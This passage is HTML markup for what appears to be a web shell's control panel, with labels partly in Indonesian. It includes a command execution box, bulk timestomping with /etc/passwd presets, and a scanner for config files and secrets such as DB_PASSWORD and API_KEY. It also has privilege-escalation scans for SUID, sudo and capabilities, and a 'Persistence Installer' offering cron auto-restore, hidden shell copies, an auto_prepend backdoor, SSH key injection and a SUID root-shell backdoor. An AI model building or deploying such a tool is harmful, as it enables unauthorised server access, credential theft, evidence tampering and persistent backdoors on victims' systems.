      <div class="chk-row"><label><input type="checkbox" name="chmod_recursive" id="chmodRecursive"> Recursive</label></div>
    </div>
    <div class="modal-foot"><button type="submit" class="btn">Apply</button><button type="button" class="btn ghost" onclick="closeModal('chmodModal')">Cancel</button></div>
  </form>
</div></div>

<!-- Confirm Delete Modal -->
<div class="modal-overlay" id="confirmDeleteModal"><div class="modal modal--sm">
  <div class="modal-head"><h3>Confirm Delete</h3><button class="modal-close" onclick="closeModal('confirmDeleteModal')">&times;</button></div>
  <div class="modal-body"><p id="deleteMessage"></p></div>
  <form method="post">
    <input type="hidden" name="delete_target" id="deleteTarget">
    <div class="modal-foot"><button type="submit" class="btn danger">Delete</button><button type="button" class="btn ghost" onclick="closeModal('confirmDeleteModal')">Cancel</button></div>
  </form>
</div></div>

<!-- Chmod Bulk Modal -->
<div class="modal-overlay" id="chmodBulkModal"><div class="modal modal--md">
  <div class="modal-head"><h3>Chmod Bulk</h3><button class="modal-close" onclick="closeModal('chmodBulkModal')">&times;</button></div>
  <div class="modal-body">
    <div class="row-inline" style="margin-bottom:10px;">
      <div class="field" style="flex:1;"><label>Selected: <span id="chmodBulkCount" class="text-primary font-bold">0</span> items</label>
        <select id="chmodBulkPerm"><option value="755">755 (rwxr-xr-x)</option><option value="644" selected>644 (rw-r--r--)</option><option value="777">777 (rwxrwxrwx)</option><option value="600">600 (rw-------)</option><option value="750">750 (rwxr-x---)</option><option value="custom">Custom...</option></select>
      </div>
      <div id="chmodBulkCustomDiv" class="field hidden" style="flex:1;"><label>Custom</label><input type="text" id="chmodBulkCustomInput" placeholder="e.g., 755"></div>
    </div>
    <div class="chk-row" style="margin-bottom:10px;"><label><input type="checkbox" id="chmodBulkRecursive"> Recursive (subfolders)</label></div>
    <div id="chmodBulkProgress" class="hidden" style="margin-bottom:10px;padding:10px;background:#000;border:1px solid var(--border);border-radius:6px;">
      <div style="font-size:11.5px;color:var(--text-dim);margin-bottom:4px;">Progress: <span id="chmodBulkCurrent" class="text-primary">0</span> / <span id="chmodBulkTotal">0</span></div>
      <div style="background:var(--bg-panel-alt);border-radius:4px;height:6px;overflow:hidden;"><div id="chmodBulkProgressBar" style="height:100%;background:linear-gradient(90deg,var(--primary-dim),var(--primary));width:0;transition:width .3s;"></div></div>
      <div id="chmodBulkStatus" style="font-size:10.5px;color:var(--cyan);margin-top:4px;">Initializing...</div>
    </div>
    <div id="chmodBulkResults" class="hidden" style="max-height:200px;overflow-y:auto;font-size:11.5px;font-family:var(--font);background:#000;padding:10px;border:1px solid var(--border);border-radius:6px;"></div>
  </div>
  <div class="modal-foot"><button id="chmodBulkExecuteBtn" class="btn" onclick="executeChmodBulk()">Execute</button><button class="btn ghost" onclick="closeModal('chmodBulkModal')" id="chmodBulkCloseBtn">Cancel</button></div>
</div></div>

<!-- Timestomp Bulk Modal -->
<div class="modal-overlay" id="timestompBulkModal"><div class="modal modal--md">
  <div class="modal-head"><h3>Timestomp Bulk</h3><button class="modal-close" onclick="closeModal('timestompBulkModal')">&times;</button></div>
  <div class="modal-body">
    <div style="background:var(--warn-dim);border:1px solid rgba(255,196,0,.4);padding:8px 12px;border-radius:6px;margin-bottom:12px;font-size:11.5px;color:var(--warn);">
      Timestomp changes modification (mtime) and access (atime) timestamps. Format: <code>DD-MM-YYYY HH:MM:SS</code>
    </div>
    <div class="row-inline" style="margin-bottom:10px;">
      <div class="field" style="flex:2;"><label>Selected: <span id="timestompBulkCount" class="text-warn">0</span> items</label><label style="margin-top:6px;">Timestamp (DD-MM-YYYY HH:MM:SS)</label><input type="text" id="timestompBulkTime" placeholder="31-12-2026 23:59:59"></div>
      <div class="field" style="flex:1;"><label>Quick Presets</label>
        <select id="timestompBulkPreset" onchange="applyTimestompPreset(this.value)">
          <option value="">-- Select Preset --</option><option value="/etc/passwd">/etc/passwd</option><option value="/bin/ls">/bin/ls</option><option value="/etc/hosts">/etc/hosts</option><option value="1year">1 Year Ago</option><option value="6months">6 Months Ago</option><option value="1month">1 Month Ago</option><option value="1week">1 Week Ago</option><option value="yesterday">Yesterday</option><option value="now">Now</option>
        </select>
      </div>
    </div>
    <div class="chk-row" style="margin-bottom:10px;"><label><input type="checkbox" id="timestompBulkRecursive"> Recursive</label></div>
    <div id="timestompBulkProgress" class="hidden" style="margin-bottom:10px;padding:10px;background:#000;border:1px solid var(--border);border-radius:6px;">
      <div style="font-size:11.5px;color:var(--text-dim);margin-bottom:4px;">Progress: <span id="timestompBulkCurrent" class="text-warn">0</span> / <span id="timestompBulkTotal">0</span></div>
      <div style="background:var(--bg-panel-alt);border-radius:4px;height:6px;overflow:hidden;"><div id="timestompBulkProgressBar" style="height:100%;background:linear-gradient(90deg,var(--warn),#ff8c00);width:0;transition:width .3s;"></div></div>
      <div id="timestompBulkStatus" style="font-size:10.5px;color:var(--cyan);margin-top:4px;">Initializing...</div>
    </div>
    <div id="timestompBulkResults" class="hidden" style="max-height:200px;overflow-y:auto;font-size:11.5px;font-family:var(--font);background:#000;padding:10px;border:1px solid var(--border);border-radius:6px;"></div>
  </div>
  <div class="modal-foot"><button id="timestompBulkExecuteBtn" class="btn" onclick="executeTimestompBulk()">Execute</button><button class="btn ghost" onclick="closeModal('timestompBulkModal')" id="timestompBulkCloseBtn">Cancel</button></div>
</div></div>

<!-- Server Info Modal -->
<div class="modal-overlay" id="serverInfoModal"><div class="modal modal--full">
  <div class="modal-head"><h3>Server Information</h3><button class="modal-close" onclick="closeModal('serverInfoModal')">&times;</button></div>
  <div class="modal-body" id="serverInfoContent">Loading server information...</div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('serverInfoModal')">Close</button></div>
</div></div>

<!-- Shell Modal (backward compat) -->
<div class="modal-overlay" id="shellModal"><div class="modal modal--full">
  <div class="modal-head"><h3>Shell</h3><button class="modal-close" onclick="closeModal('shellModal')">&times;</button></div>
  <div class="modal-body">
    <form id="shellFormModal" style="display:flex;gap:8px;margin-bottom:12px;">
      <input type="text" id="shellCmdInputModal" name="cmd" placeholder="Enter command..." style="flex:1;background:var(--bg-input);border:1px solid var(--border);border-radius:5px;color:var(--primary);padding:8px 12px;font-size:14px;outline:none;">
      <button type="submit" class="btn">Execute</button>
    </form>
    <div class="term" id="shellOutputModal" style="height:calc(100% - 60px);max-height:none;">Awaiting command...</div>
  </div>
</div></div>

<!-- Search Results Modal -->
<div class="modal-overlay" id="searchResultsModal"><div class="modal modal--full">
  <div class="modal-head"><h3>Search Results</h3><button class="modal-close" onclick="closeModal('searchResultsModal')">&times;</button></div>
  <div class="modal-body" id="searchResultsModalContent"></div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('searchResultsModal')">Close</button></div>
</div></div>

<!-- Website Discover Modal -->
<div class="modal-overlay" id="websiteDiscoverModal"><div class="modal modal--full">
  <div class="modal-head"><h3>Website Discovery</h3><button class="modal-close" onclick="closeModal('websiteDiscoverModal')">&times;</button></div>
  <div class="modal-body" style="padding:0;">
    <div class="discover-container" style="padding:16px;">
      <div class="discover-sidebar">
        <h4 style="margin:0 0 12px;color:var(--info);font-size:14px;">Konfigurasi Scan</h4>
        <div style="margin-bottom:10px;">
          <label style="font-size:11.5px;color:var(--text-dim);display:block;margin-bottom:6px;">Mode Pencarian:</label>
          <div class="search-type-selector">
            <div class="search-type active" data-type="filename" onclick="selectSearchType('filename')">Nama File</div>
            <div class="search-type" data-type="content" onclick="selectSearchType('content')">Konten File</div>
          </div>
        </div>
        <div style="margin-bottom:10px;">
          <label style="font-size:11.5px;color:var(--text-dim);display:block;margin-bottom:4px;">Pattern (pisah dengan koma):</label>
          <textarea id="searchPattern" rows="3" placeholder="index.php, index.html, .htaccess" style="width:100%;font-size:11.5px;resize:vertical;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:4px;padding:6px;">index.php, index.html, .htaccess</textarea>
          <p id="patternHint" style="font-size:10.5px;color:var(--text-dim);margin:4px 0 0;">Contoh: *.php, config.*, wp-config.php</p>
        </div>
        <div style="margin-bottom:10px;">
          <label style="font-size:11.5px;color:var(--text-dim);display:block;margin-bottom:4px;">Custom Path (opsional):</label>
          <input type="text" id="customPath" placeholder="/var/custom, /home/user/sites" style="width:100%;font-size:11.5px;padding:6px;background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:4px;">
          <p style="font-size:10.5px;color:var(--text-dim);margin:4px 0 0;">Akan ditambahkan ke path default</p>
        </div>
        <div style="margin-bottom:10px;">
          <label style="font-size:11.5px;color:var(--text-dim);display:block;margin-bottom:6px;">Kedalaman Scan:</label>
          <div class="scan-mode" data-mode="quick" onclick="selectScanMode('quick')"><strong>Quick</strong><span class="scan-desc">1-2 level, ~30 detik</span></div>
          <div class="scan-mode active" data-mode="standard" onclick="selectScanMode('standard')"><strong>Standard</strong><span class="scan-desc">3-4 level, ~2 menit</span></div>
          <div class="scan-mode" data-mode="deep" onclick="selectScanMode('deep')"><strong>Deep</strong><span class="scan-desc">5-6 level, ~5 menit</span></div>
          <div class="scan-mode" data-mode="brutal" onclick="selectScanMode('brutal')"><strong>Brutal</strong><span class="scan-desc">8+ level, >10 menit</span></div>
        </div>
        <div style="margin-bottom:12px;padding:10px;background:var(--bg);border-radius:var(--radius);">
          <label style="font-size:11.5px;color:var(--text-dim);display:flex;align-items:center;cursor:pointer;">
            <input type="checkbox" id="extractTitle" checked style="margin-right:8px;">Extract &lt;title&gt; dari index
          </label>
          <label style="font-size:11.5px;color:var(--text-dim);display:flex;align-items:center;cursor:pointer;margin-top:8px;">
            <input type="checkbox" id="showPreview" style="margin-right:8px;">Tampilkan preview konten
          </label>
          <label style="font-size:11.5px;color:var(--text-dim);display:flex;align-items:center;cursor:pointer;margin-top:8px;">
            <input type="checkbox" id="useCache" checked style="margin-right:8px;">Gunakan cache (1 jam)
          </label>
        </div>
        <button id="startScanBtn" class="btn" onclick="startWebsiteScan()" style="width:100%;padding:10px;font-size:14px;font-weight:bold;">Mulai Scan</button>
        <div style="margin-top:12px;padding:10px;border:1px solid var(--warn);border-radius:var(--radius);background:rgba(255,170,0,.05);">
          <h4 style="margin:0 0 8px;color:var(--warn);font-size:12px;">VirtualHost Scanner</h4>
          <p style="font-size:10.5px;color:var(--text-dim);margin:0 0 8px;">Temukan domain &amp; document root dari konfigurasi web server</p>
          <div style="display:flex;gap:4px;margin-bottom:4px;">
            <button class="btn ghost" onclick="scanVirtualHosts('apache')" style="flex:1;font-size:10.5px;padding:6px;color:var(--warn);">Apache</button>
            <button class="btn ghost" onclick="scanVirtualHosts('nginx')" style="flex:1;font-size:10.5px;padding:6px;color:var(--ok);">Nginx</button>
          </div>
          <div style="display:flex;gap:4px;">
            <button class="btn ghost" onclick="scanVirtualHosts('litespeed')" style="flex:1;font-size:10.5px;padding:6px;color:#f0f;">LiteSpeed</button>
            <button class="btn ghost" onclick="scanVirtualHosts('all')" style="flex:1;font-size:10.5px;padding:6px;color:var(--info);">All Servers</button>
          </div>
        </div>
        <div id="scanStats" class="hidden" style="margin-top:12px;padding:10px;background:var(--bg);border-radius:var(--radius);font-size:11.5px;color:var(--text-dim);">
          <div>Waktu: <span id="scanTime">0s</span></div>
          <div>Ditemukan: <span id="scanCount">0</span></div>
          <div>Discan: <span id="scannedCount">0</span></div>
          <div>Status: <span id="scanStatus">Menunggu...</span></div>
        </div>
      </div>
      <div class="discover-main">
        <div id="websiteDiscoverContent" class="discover-content">
          <div class="discover-placeholder">
            <h3 style="color:var(--primary);margin:8px 0;">Website Discovery</h3>
            <p style="color:var(--text-dim);">Konfigurasi pencarian di panel kiri, lalu klik "Mulai Scan"</p>
            <div style="margin-top:12px;text-align:left;padding:10px;background:var(--bg);border-radius:var(--radius);font-size:12px;">
              <p style="color:var(--primary);margin-bottom:8px;"><strong>Tips Penggunaan:</strong></p>
              <p style="color:var(--text-dim);margin:4px 0;"><strong>Mode Nama File:</strong></p>
              <p style="color:var(--text);margin:2px 0 2px 12px;">index.php, index.html, .htaccess</p>
              <p style="color:var(--text);margin:2px 0 2px 12px;">wp-config.php, configuration.php</p>
              <p style="color:var(--text);margin:2px 0 2px 12px;">*.php, config.* (wildcard)</p>
              <p style="color:var(--text-dim);margin:8px 0 4px;"><strong>Mode Konten:</strong></p>
              <p style="color:var(--text);margin:2px 0 2px 12px;">DB_PASSWORD, username, password</p>
              <p style="color:var(--text);margin:2px 0 2px 12px;">API_KEY, SECRET_KEY, token</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('websiteDiscoverModal')">Close</button></div>
</div></div>

<!-- DB Explore Modal -->
<div class="modal-overlay" id="dbExploreModal"><div class="modal modal--md">
  <div class="modal-head"><h3>WordPress DB Explorer</h3><button class="modal-close" onclick="closeModal('dbExploreModal')">&times;</button></div>
  <div class="modal-body" id="dbExploreContent">Scanning for WordPress installations...</div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('dbExploreModal')">Close</button></div>
</div></div>

<!-- DB Connect Modal -->
<div class="modal-overlay" id="dbConnectModal"><div class="modal modal--md">
  <div class="modal-head"><h3>Database Connection</h3><button class="modal-close" onclick="closeModal('dbConnectModal')">&times;</button></div>
  <div class="modal-body">
    <div class="stack">
      <div class="row-inline"><div class="field"><label>Host</label><input type="text" id="dbHost" value="localhost"></div><div class="field"><label>Port</label><input type="text" id="dbPort" value="3306"></div></div>
      <div class="row-inline"><div class="field"><label>Username</label><input type="text" id="dbUser" value="root"></div><div class="field"><label>Password</label><input type="password" id="dbPass"></div></div>
      <div class="field"><label>Database</label><input type="text" id="dbName" placeholder="database_name"></div>
      <button class="btn" onclick="testDbConnection()">Test Connection</button>
      <button class="btn" onclick="connectToDatabase()">Connect</button>
      <div id="dbConnectOutput" style="background:#000;border:1px solid var(--border);border-radius:6px;padding:10px;font-size:11.5px;color:var(--primary);white-space:pre-wrap;min-height:40px;display:none;"></div>
    </div>
  </div>
</div></div>

<!-- DB Manager Modal -->
<div class="modal-overlay" id="dbManagerModal"><div class="modal modal--full">
  <div class="modal-head"><h3 id="dbManagerTitle">Database Manager</h3><button class="modal-close" onclick="closeModal('dbManagerModal')">&times;</button></div>
  <div class="modal-body">
    <div class="db-manager-body">
      <div class="db-sidebar" id="dbTableList">Loading tables...</div>
      <div class="db-main-content">
        <div class="field"><label>SQL Query</label><textarea id="sqlQueryInput" placeholder="SELECT * FROM ..." style="min-height:80px;"></textarea></div>
        <button class="btn" onclick="executeSqlQuery()">Execute Query</button>
        <button class="btn ghost" onclick="clearSqlResult()">Clear</button>
        <div id="sqlResultArea" style="background:#000;border:1px solid var(--border);border-radius:6px;padding:10px;font-size:11.5px;color:var(--primary);white-space:pre-wrap;min-height:200px;max-height:400px;overflow:auto;"></div>
      </div>
    </div>
  </div>
</div></div>

<!-- Privesc Modals -->
<div class="modal-overlay" id="privescModal"><div class="modal modal--full">
  <div class="modal-head"><h3>Privilege Escalation</h3><button class="modal-close" onclick="closeModal('privescModal')">&times;</button></div>
  <div class="modal-body" id="privescModalContent"></div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('privescModal')">Close</button></div>
</div></div>

<div class="modal-overlay" id="privescSuidModal"><div class="modal modal--full">
  <div class="modal-head"><h3>SUID/SGID Scan</h3><button class="modal-close" onclick="closeModal('privescSuidModal')">&times;</button></div>
  <div class="modal-body"><div id="privescSuidOutput" style="background:#000;border:1px solid var(--border);border-radius:6px;padding:12px;font-size:11.5px;color:var(--primary);white-space:pre-wrap;max-height:500px;overflow-y:auto;">Scanning...</div></div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('privescSuidModal')">Close</button></div>
</div></div>

<div class="modal-overlay" id="privescSudoModal"><div class="modal modal--full">
  <div class="modal-head"><h3>Sudo Rights Analysis</h3><button class="modal-close" onclick="closeModal('privescSudoModal')">&times;</button></div>
  <div class="modal-body"><div id="privescSudoOutput" style="background:#000;border:1px solid var(--border);border-radius:6px;padding:12px;font-size:11.5px;color:var(--primary);white-space:pre-wrap;max-height:500px;overflow-y:auto;">Scanning...</div></div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('privescSudoModal')">Close</button></div>
</div></div>

<div class="modal-overlay" id="privescCapModal"><div class="modal modal--full">
  <div class="modal-head"><h3>Capabilities Scan</h3><button class="modal-close" onclick="closeModal('privescCapModal')">&times;</button></div>
  <div class="modal-body"><div id="privescCapOutput" style="background:#000;border:1px solid var(--border);border-radius:6px;padding:12px;font-size:11.5px;color:var(--primary);white-space:pre-wrap;max-height:500px;overflow-y:auto;">Scanning...</div></div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('privescCapModal')">Close</button></div>
</div></div>

<div class="modal-overlay" id="privescSymlinkModal"><div class="modal modal--full">
  <div class="modal-head"><h3>Symlink Vulnerabilities</h3><button class="modal-close" onclick="closeModal('privescSymlinkModal')">&times;</button></div>
  <div class="modal-body"><div id="privescSymlinkOutput" style="background:#000;border:1px solid var(--border);border-radius:6px;padding:12px;font-size:11.5px;color:var(--primary);white-space:pre-wrap;max-height:500px;overflow-y:auto;">Scanning...</div></div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('privescSymlinkModal')">Close</button></div>
</div></div>

<div class="modal-overlay" id="privescPermsModal"><div class="modal modal--full">
  <div class="modal-head"><h3>Permission Analysis</h3><button class="modal-close" onclick="closeModal('privescPermsModal')">&times;</button></div>
  <div class="modal-body"><div id="privescPermsOutput" style="background:#000;border:1px solid var(--border);border-radius:6px;padding:12px;font-size:11.5px;color:var(--primary);white-space:pre-wrap;max-height:500px;overflow-y:auto;">Scanning...</div></div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('privescPermsModal')">Close</button></div>
</div></div>

<div class="modal-overlay" id="privescPersistModal"><div class="modal modal--full">
  <div class="modal-head"><h3>Persistence Installer</h3><button class="modal-close" onclick="closeModal('privescPersistModal')">&times;</button></div>
  <div class="modal-body" id="privescPersistContent">
    <p style="color:var(--text-dim);font-size:11.5px;margin:0 0 10px 0;">Pilih mekanisme persistence yang ingin di-install. Hasil dan panduan akan muncul di textarea bawah.</p>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:8px;margin-bottom:12px;">
      <div class="persist-card" style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
          <strong style="color:var(--primary);font-size:12px;">&#9200; Cron Auto-Restore</strong>
          <span id="persistStatus_cron" class="persist-badge">Ready</span>
        </div>
        <p style="color:var(--text-dim);font-size:10.5px;margin:0 0 6px 0;">Backup ke system dirs + cron restore otomatis setiap menit jika shell dihapus.</p>
        <button class="btn small" onclick="persistInstall('cron',this)">Install</button>
      </div>
      <div class="persist-card" style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
          <strong style="color:var(--primary);font-size:12px;">&#128193; Web Backups</strong>
          <span id="persistStatus_web_backup" class="persist-badge">Ready</span>
        </div>
        <p style="color:var(--text-dim);font-size:10.5px;margin:0 0 6px 0;">Copy shell ke hidden files (.config.php, .backup.php, dll) di folder yang sama.</p>
        <button class="btn small" onclick="persistInstall('web_backup',this)">Install</button>
      </div>
      <div class="persist-card" style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
          <strong style="color:var(--primary);font-size:12px;">&#128196; PHP Prepend</strong>
          <span id="persistStatus_php_prepend" class="persist-badge">Ready</span>
        </div>
        <p style="color:var(--text-dim);font-size:10.5px;margin:0 0 6px 0;">Buat file auto_prepend backdoor. Perlu aktivasi manual via .htaccess/php.ini.</p>
        <button class="btn small" onclick="persistInstall('php_prepend',this)">Install</button>
      </div>
      <div class="persist-card" style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
          <strong style="color:var(--primary);font-size:12px;">&#128273; SSH Key</strong>
          <span id="persistStatus_ssh" class="persist-badge">Ready</span>
        </div>
        <p style="color:var(--text-dim);font-size:10.5px;margin:0 0 6px 0;">Inject SSH public key ke authorized_keys untuk akses SSH tanpa password.</p>
        <button class="btn small" onclick="persistInstall('ssh',this)">Install</button>
      </div>
      <div class="persist-card" style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
          <strong style="color:var(--primary);font-size:12px;">&#128259; Bashrc</strong>
          <span id="persistStatus_bashrc" class="persist-badge">Ready</span>
        </div>
        <p style="color:var(--text-dim);font-size:10.5px;margin:0 0 6px 0;">Append restore snippet ke ~/.bashrc. Shell direstore saat user login SSH.</p>
        <button class="btn small" onclick="persistInstall('bashrc',this)">Install</button>
      </div>
      <div class="persist-card" style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
          <strong style="color:var(--primary);font-size:12px;">&#128194; Web Alias</strong>
          <span id="persistStatus_web_alias" class="persist-badge">Ready</span>
        </div>
        <p style="color:var(--text-dim);font-size:10.5px;margin:0 0 6px 0;">Duplikat shell dengan nama umum (config.php, settings.php, init.php).</p>
        <button class="btn small" onclick="persistInstall('web_alias',this)">Install</button>
      </div>
      <div class="persist-card" style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
          <strong style="color:var(--primary);font-size:12px;">&#128737; SUID Backdoor</strong>
          <span id="persistStatus_suid" class="persist-badge">Ready</span>
        </div>
        <p style="color:var(--text-dim);font-size:10.5px;margin:0 0 6px 0;">Buat SUID binary root shell. Butuh root access untuk berhasil.</p>
        <button class="btn small" onclick="persistInstall('suid',this)">Install</button>
      </div>
    </div>
    <div id="persistUrlsBox" style="display:none;margin-bottom:8px;background:var(--bg-input);border:1px solid var(--primary);border-radius:4px;padding:8px 10px;">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
        <span style="color:var(--primary);font-size:11px;font-weight:bold;">ACCESS URLs</span>
        <button class="btn small" onclick="persistCopyUrls()">Copy URLs</button>
      </div>
      <textarea id="persistUrlsArea" readonly style="width:100%;height:60px;background:#000;color:var(--primary);border:1px solid var(--border);border-radius:3px;padding:6px 8px;font-family:monospace;font-size:10.5px;resize:vertical;"></textarea>
    </div>
    <div style="margin-bottom:8px;">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
        <span style="color:var(--text-dim);font-size:11px;font-weight:bold;text-transform:uppercase;">Result &amp; Guide</span>
        <button class="btn small ghost" onclick="persistCopyResult()">Copy</button>
      </div>
      <textarea id="persistResultArea" readonly style="width:100%;height:220px;background:#000;color:var(--primary);border:1px solid var(--border);border-radius:4px;padding:10px;font-family:monospace;font-size:11px;resize:vertical;" placeholder="Klik tombol Install pada mekanisme di atas..."></textarea>
    </div>
    <div id="privescPersistOutput" style="background:#000;border:1px solid var(--border);border-radius:6px;padding:12px;font-size:11.5px;color:var(--primary);white-space:pre-wrap;max-height:500px;overflow-y:auto;display:none;"></div>
  </div>
  <div class="modal-foot">
    <button class="btn" onclick="persistInstallAll()">Install All</button>
    <button class="btn ghost" onclick="closeModal('privescPersistModal')">Close</button>
  </div>
</div></div>

<!-- Confirm Action Modal (generic reusable) -->
<div class="modal-overlay" id="modal-confirm"><div class="modal modal--sm">
  <div class="modal-head"><h3>Confirm</h3><button class="modal-close" onclick="closeModal('modal-confirm')">&times;</button></div>
  <div class="modal-body"><p id="confirm-message">Are you sure?</p></div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('modal-confirm')">Cancel</button><button class="btn danger" id="confirm-action-btn">Confirm</button></div>
</div></div>

<!-- Crontab Modal -->
<div class="modal-overlay" id="cronModal"><div class="modal modal--md">
  <div class="modal-head"><h3>Crontab Editor</h3><button class="modal-close" onclick="closeModal('cronModal')">&times;</button></div>
  <div class="modal-body">
    <div class="section-title">CURRENT CRON JOBS</div>
    <div id="cronList" class="output-box sm" style="margin-bottom:12px;color:var(--text);">Loading...</div>
    <div class="section-title">ADD NEW JOB</div>
    <div class="stack" style="gap:8px;">
      <div class="row-inline"><div class="field"><label>Minute</label><input type="text" id="cronMinute" value="*" placeholder="0-59 or *"></div><div class="field"><label>Hour</label><input type="text" id="cronHour" value="*" placeholder="0-23 or *"></div><div class="field"><label>Day</label><input type="text" id="cronDay" value="*" placeholder="1-31 or *"></div></div>
      <div class="row-inline"><div class="field"><label>Month</label><input type="text" id="cronMonth" value="*" placeholder="1-12 or *"></div><div class="field"><label>DOW</label><input type="text" id="cronDOW" value="*" placeholder="0-6 or *"></div></div>
      <div class="field"><label>Command</label><input type="text" id="cronCmd" placeholder="Command to execute"></div>
      <button class="btn" onclick="addCronJob()">Add Cron Job</button>
    </div>
    <div id="cronOutput" class="output-box sm hidden" style="margin-top:12px;"></div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="loadCronJobs()">Refresh</button><button class="btn ghost" onclick="closeModal('cronModal')">Close</button></div>
</div></div>

<!-- Firewall Modal -->
<div class="modal-overlay" id="firewallModal"><div class="modal modal--md">
  <div class="modal-head"><h3>Firewall Checker</h3><button class="modal-close" onclick="closeModal('firewallModal')">&times;</button></div>
  <div class="modal-body">
    <div class="btn-row">
      <button class="btn" onclick="checkFirewallStatus()">Status</button>
      <button class="btn ghost" onclick="checkFirewallRules()">Rules</button>
      <button class="btn ghost" onclick="checkFirewallInfo()">Info</button>
    </div>
    <div id="firewallOutput" class="output-box">Click a button to check firewall</div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('firewallModal')">Close</button></div>
</div></div>

<!-- Hash Modal -->
<div class="modal-overlay" id="hashModal"><div class="modal modal--md">
  <div class="modal-head"><h3>Hash Calculator</h3><button class="modal-close" onclick="closeModal('hashModal')">&times;</button></div>
  <div class="modal-body">
    <div class="field" style="margin-bottom:10px;"><label>Algorithm</label>
      <select id="hashAlgorithm"><option value="md5">MD5</option><option value="sha1">SHA1</option><option value="sha256" selected>SHA256</option><option value="sha512">SHA512</option></select>
    </div>
    <div class="section-title">HASH TEXT</div>
    <div class="field" style="margin-bottom:8px;"><textarea id="hashText" placeholder="Enter text to hash..."></textarea></div>
    <button class="btn" onclick="hashText()" style="margin-bottom:12px;">Hash Text</button>
    <div class="section-title">HASH FILE</div>
    <div class="field" style="margin-bottom:8px;"><input type="text" id="hashFile" placeholder="/path/to/file"></div>
    <button class="btn" onclick="hashFile()" style="margin-bottom:12px;">Hash File</button>
    <div class="section-title">COMPARE</div>
    <div class="row-inline" style="margin-bottom:8px;"><div class="field"><input type="text" id="hash1" placeholder="First hash"></div><div class="field"><input type="text" id="hash2" placeholder="Second hash"></div></div>
    <button class="btn ghost" onclick="compareHashes()" style="margin-bottom:12px;">Compare</button>
    <div id="hashOutput" class="output-box sm">Results will appear here</div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('hashModal')">Close</button></div>
</div></div>

<!-- Kernel Modal -->
<div class="modal-overlay" id="kernelModal"><div class="modal modal--md">
  <div class="modal-head"><h3>Kernel Protection</h3><button class="modal-close" onclick="closeModal('kernelModal')">&times;</button></div>
  <div class="modal-body">
    <div class="btn-row">
      <button class="btn" onclick="checkAllProtections()">All</button>
      <button class="btn ghost" onclick="checkASLR()">ASLR</button>
      <button class="btn ghost" onclick="checkSELinux()">SELinux</button>
    </div>
    <div id="kernelOutput" class="output-box">Click a button to check</div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('kernelModal')">Close</button></div>
</div></div>

<!-- Logs Modal -->
<div class="modal-overlay" id="logsModal"><div class="modal modal--md">
  <div class="modal-head"><h3>Logs Viewer</h3><button class="modal-close" onclick="closeModal('logsModal')">&times;</button></div>
  <div class="modal-body">
    <div class="section-title">AVAILABLE LOG FILES</div>
    <div id="logsList" class="output-box sm" style="margin-bottom:12px;max-height:150px;color:var(--text);">Loading...</div>
    <div class="section-title">READ LOGS</div>
    <div class="row-inline" style="margin-bottom:8px;"><div class="field" style="flex:2;"><input type="text" id="logFile" placeholder="/var/log/syslog"></div><div class="field"><input type="number" id="logLines" value="100" placeholder="Lines"></div></div>
    <button class="btn" onclick="readLogs()" style="margin-bottom:12px;">Read</button>
    <div id="logsOutput" class="output-box" style="font-size:10.5px;">Log content will appear here</div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="listLogFiles()">Refresh</button><button class="btn ghost" onclick="closeModal('logsModal')">Close</button></div>
</div></div>

<!-- Perm Modal -->
<div class="modal-overlay" id="permModal"><div class="modal modal--md">
  <div class="modal-head"><h3>Permission Tracker</h3><button class="modal-close" onclick="closeModal('permModal')">&times;</button></div>
  <div class="modal-body">
    <div class="section-title">CHECK FILE PERMISSIONS</div>
    <div class="field" style="margin-bottom:8px;"><input type="text" id="permFile" placeholder="/path/to/file"></div>
    <button class="btn" onclick="checkFilePermissions()" style="margin-bottom:12px;">Check</button>
    <div class="section-title">FIND PERMISSION DENIED</div>
    <div class="field" style="margin-bottom:8px;"><input type="text" id="permDir" value="/" placeholder="/directory"></div>
    <button class="btn ghost" onclick="findDeniedErrors()" style="margin-bottom:12px;">Find Errors</button>
    <div id="permOutput" class="output-box" style="font-size:10.5px;">Results will appear here</div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('permModal')">Close</button></div>
</div></div>

<!-- Port Modal -->
<div class="modal-overlay" id="portModal"><div class="modal modal--md">
